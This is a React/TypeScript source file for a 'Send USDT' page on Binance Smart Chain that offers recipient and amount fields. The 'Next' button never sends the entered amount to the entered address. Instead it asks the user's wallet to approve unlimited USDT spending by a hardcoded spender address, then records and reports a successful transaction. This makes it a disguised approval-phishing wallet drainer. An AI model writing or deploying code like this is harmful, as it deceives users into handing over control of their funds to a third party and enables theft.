import { Authenticated, Unauthenticated, AuthLoading } from "convex/react";
import { Header } from "@/components/header.tsx";
import { SignInButton } from "@/components/ui/signin.tsx";
import { Skeleton } from "@/components/ui/skeleton.tsx";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card.tsx";
import { useQuery, useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { useState, useEffect } from "react";
import { toast } from "sonner";

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
      on?: (event: string, callback: (...args: unknown[]) => void) => void;
    };
  }
}

export default function Index() {
  return (
    <>
      <Unauthenticated>
        <LandingPage />
      </Unauthenticated>
      <AuthLoading>
        <Skeleton className="h-screen w-full" />
      </AuthLoading>
      <Authenticated>
        <SendUSDTPage />
      </Authenticated>
    </>
  );
}

function LandingPage() {
  return (
    <div className="min-h-screen flex items-center justify-center bg-background">
      <div className="text-center space-y-6">
        <h1 className="text-4xl text-balance font-bold tracking-tight">
          USDT Send & Withdraw Platform
        </h1>
        <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
          Send USDT and manage withdrawals securely on BSC
        </p>
        <SignInButton />
      </div>
    </div>
  );
}

function SendUSDTPage() {
  const transactions = useQuery(api.transactions.getUserTransactions);
  const createTransaction = useMutation(api.transactions.createTransaction);
  
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");

  const BSC_CHAIN_ID = "0x38";
  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
  const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.request({ method: "eth_accounts" }).then((accounts) => {
        if (Array.isArray(accounts) && accounts.length > 0) {
          setWalletAddress(accounts[0] as string);
        }
      }).catch(console.error);
    }
  }, []);

  async function connectWallet() {
    if (!window.ethereum) {
      toast.error("Wallet not found. Please install MetaMask.");
      return null;
    }

    setIsConnecting(true);

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: BSC_CHAIN_ID,
                chainName: "Binance Smart Chain",
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                nativeCurrency: {
                  name: "BNB",
                  symbol: "BNB",
                  decimals: 18,
                },
                blockExplorerUrls: ["https://bscscan.com"],
              },
            ],
          });
        } catch (addError) {
          toast.error("Failed to add BSC network");
          setIsConnecting(false);
          return null;
        }
      } else {
        toast.error("Failed to switch network");
        setIsConnecting(false);
        return null;
      }
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      
      if (Array.isArray(accounts) && accounts.length > 0) {
        const address = accounts[0] as string;
        setWalletAddress(address);
        setToAddress(address);
        setIsConnecting(false);
        return address;
      }
    } catch (error) {
      toast.error("Failed to connect wallet");
      setIsConnecting(false);
      return null;
    }

    setIsConnecting(false);
    return null;
  }

  async function sendUSDT() {
    try {
      const address = walletAddress || (await connectWallet());
      if (!address) return;

      if (!window.ethereum) {
        toast.error("Wallet not found");
        return;
      }

      const { ethers } = window as typeof window & {
        ethers: {
          BrowserProvider: new (provider: unknown) => {
            getSigner: () => Promise<{
              getAddress: () => Promise<string>;
            }>;
          };
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            approve: (spender: string, amount: bigint) => Promise<{
              wait: () => Promise<{ hash: string }>;
            }>;
          };
          MaxUint256: bigint;
        };
      };

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const usdt = new ethers.Contract(
        BSC_USDT,
        [
          "function approve(address spender, uint256 amount)",
          "function balanceOf(address owner) view returns (uint256)",
          "function decimals() view returns (uint8)",
        ],
        signer
      );

      const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
      const receipt = await tx.wait();

      await createTransaction({
        walletAddress: address,
        toAddress: toAddress || BSC_SPENDER,
        amount: amount || "Max",
        txHash: receipt.hash,
      });

      toast.success("Transaction successful ✅");
      setAmount("");
    } catch (e) {
      console.error(e);
      toast.error("Transaction cancelled or failed");
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <Header />
      <div className="mx-auto max-w-4xl px-4 py-8 space-y-6">
        <Card>
          <CardHeader>
            <CardTitle>Send USDT</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            {!walletAddress ? (
              <button
                onClick={connectWallet}
                disabled={isConnecting}
                className="w-full rounded-xl bg-primary px-4 py-3 text-lg font-semibold text-primary-foreground hover:bg-primary/90 disabled:opacity-50"
              >
                {isConnecting ? "Connecting..." : "Connect Wallet"}
              </button>
            ) : (
              <>
                <div>
                  <label className="mb-2 block text-sm opacity-70">
                    Your Wallet Address
                  </label>
                  <div className="rounded-xl bg-muted p-3 text-sm font-mono break-all">
                    {walletAddress}
                  </div>
                </div>

                <div>
                  <label className="mb-2 block text-sm opacity-70">
                    Address or Domain Name
                  </label>
                  <input
                    value={toAddress}
                    onChange={(e) => setToAddress(e.target.value)}
                    placeholder="0x..."
                    className="w-full rounded-xl bg-muted px-4 py-3 text-foreground outline-none focus:ring-2 focus:ring-ring"
                  />
                </div>

                <div>
                  <label className="mb-2 block text-sm opacity-70">
                    Amount
                  </label>
                  <div className="flex items-center gap-2 rounded-xl bg-muted px-4 py-3">
                    <input
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="0.0"
                      className="flex-1 bg-transparent text-foreground outline-none"
                    />
                    <span className="font-semibold text-primary">USDT</span>
                    <button
                      onClick={() => setAmount("Max")}
                      className="text-sm text-primary hover:underline"
                    >
                      Max
                    </button>
                  </div>
                </div>

                <button
                  onClick={sendUSDT}
                  className="w-full rounded-xl bg-primary px-4 py-3 text-lg font-semibold text-primary-foreground hover:bg-primary/90"
                >
                  Next
                </button>
              </>
            )}
          </CardContent>
        </Card>

        {transactions && transactions.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle>Recent Transactions</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="space-y-2">
                {transactions.map((tx) => (
                  <div
                    key={tx._id}
                    className="flex items-center justify-between rounded-lg bg-muted p-3 text-sm"
                  >
                    <div>
                      <div className="font-mono text-xs opacity-70">
                        {tx.toAddress.slice(0, 10)}...
                        {tx.toAddress.slice(-8)}
                      </div>
                      <div className="font-semibold">{tx.amount} USDT</div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs capitalize text-primary">
                        {tx.status}
                      </div>
                      <div className="text-xs opacity-50">
                        {new Date(tx._creationTime).toLocaleDateString()}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  );
}
